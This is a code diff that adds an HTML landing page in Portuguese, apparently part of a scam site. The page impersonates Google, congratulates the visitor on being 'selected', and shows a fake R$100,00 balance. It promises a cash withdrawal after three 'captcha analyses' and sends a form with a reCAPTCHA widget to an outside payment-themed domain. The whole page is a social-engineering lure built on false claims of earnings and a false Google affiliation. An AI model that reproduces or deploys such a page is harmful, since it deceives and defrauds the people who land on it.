@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captcha Redirect</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+    <div class="main-container">
+        <div class="container">
+            <img src="assets/img/img1.png" alt="Description of image" class="responsive-img" />
+            <p>O Google Captchas precisa de você para aumentar a segurança dos seus sites analisando os Captchas estão marcados corretamente ou incorretamente.</p>
+            <p style="padding: 20px;">Saldo: <span style="background-color: #4CAF50; padding: 10px ; border-radius: 10px; color: #FFF; font-weight: bold"  >R$100,00</span></p>
+        </div>
+        <div class="container">
+            <p><b>Parabéns, você foi selecionado!</b></p>
+            <p>Você acaba de receber acesso à nova ferramenta do Google para análise de Captchas. <b>Aproveite, você já ganhou R$100,00!</b></p>
+            <p>Faça 3 análises e <b>realize seu primeiro saque</b> em minutos!</p>
+            <p>Antes de responder, confirme que você não é um robô<br>Para receber sua comissão.</p>
+
+            <form action="https://api.captchapay.org/captcha/valide4.php" method="POST">
+                <center><div class="g-recaptcha" data-sitekey="6LeFvSEqAAAAAIn7IAxAsaJMtpLyjo4DmINrfEU9"></div></center>
+                <br/>
+                <input class="submit-btn" type="submit" value="Sim">
+                <input class="submit-btn1" type="submit" value="Não">
+              </form>
+
+        </div>
+    </div>
+</body>
+</html>
